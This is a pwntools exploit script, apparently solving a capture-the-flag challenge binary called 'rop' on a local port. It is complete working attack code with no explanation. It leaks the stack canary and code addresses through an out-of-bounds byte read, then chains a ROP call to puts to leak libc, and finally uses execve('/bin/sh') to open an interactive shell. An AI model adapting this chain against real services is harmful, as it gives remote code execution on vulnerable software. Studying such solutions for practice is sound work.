#!/usr/bin/env python3

from pwn import *
import binascii
import os

exe = context.binary = ELF("rop")

if args.REMOTE:
    libc = ELF("./libc-docker.so")
else:
    libc = ELF("/usr/lib/libc.so.6")

remotehost = ("127.0.0.1", 22226)

context.binary = exe.path
context.terminal = ['st', '-e', 'sh', '-c']

gdbscript = '''
b *main
continue
'''.format(**locals())


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


#################################################################


frase_canary_offset = 0x108
frase_main36_offset = frase_canary_offset + 16

name_canary_offset = 0x108
name_rip_offset = name_canary_offset + 16


def readbyte(frase_offset):
    io.recvlines(5)
    io.sendline("1")
    io.recvline()
    io.sendline(str(frase_offset))
    io.recvuntil("-")
    byte = u8(io.recv(1))
    io.recvuntil("\n")

    return byte

def read64(frase_offset):
    ret = []
    for i in range(0, 8):
        ret.append(readbyte(frase_offset+i))
    io.sendline("y")
    return u64(fit(ret, word_size=8))


io = start()
io.recvline()

canary = read64(frase_canary_offset)
io.recvline()

log.info("canary: %x" % canary)


main36 = read64(frase_main36_offset)
io.recvline()

log.info("main+36: %x" % main36)
exe.address = main36 - (exe.sym.main + 36)
log.info("exe segment: %x" % exe.address)



io.recvlines(5)
io.sendline("3")
io.recvline()
io.sendline("n")
io.recvline()

r = ROP(exe)
r.call(exe.sym.puts, [exe.sym.got.printf])
r.call(exe.sym.main)

payload = dict()

payload[name_canary_offset] = p64(canary)
payload[name_rip_offset] = r.chain()

payload = fit(payload)

io.sendline(payload)
io.recvline()
io.recvline()
line = io.recvline(False).ljust(8, b"\x00")

libc_printf = u64(line)
libc.address = libc_printf - libc.sym.printf

log.info("libc printf: %x", libc_printf)
log.info("libc segment: %x", libc.address)

io.recvlines(6)
io.sendline("3")
io.recvline()
io.sendline("n")
io.recvline()


r = ROP(libc)

r.call(libc.sym.execve, [next(libc.search(b"/bin/sh")), 0, 0])

payload = dict()

payload[name_canary_offset] = p64(canary)
payload[name_rip_offset] = r.chain()

payload = fit(payload)
io.sendline(payload)

io.interactive()